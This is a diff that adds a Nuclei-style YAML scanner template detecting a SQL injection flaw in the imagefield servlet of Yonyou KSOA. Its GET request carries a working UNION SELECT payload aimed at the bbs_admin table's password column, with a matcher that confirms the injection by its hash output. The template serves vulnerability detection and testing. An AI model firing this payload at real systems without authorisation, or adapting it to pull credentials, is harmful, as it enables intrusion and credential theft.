@@ -1,0 +1,24 @@
+id: yonyou-ksoa-imagefield-sqli
+info:
+  name: 用友 KSOA imagefield 接口 - SQL 注入漏洞
+  author: secking
+  severity: high
+  reference:
+    - https://www.yonyou.com/
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: yonyou
+    product: ksoa
+  tags: sqli,vuln,yonyou
+variables:
+  rInt1: '{{rand_int(10000, 99999)}}'
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','{{rInt1}}'))--+"
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, substr(md5(to_string(rInt1)), 2, 28))'
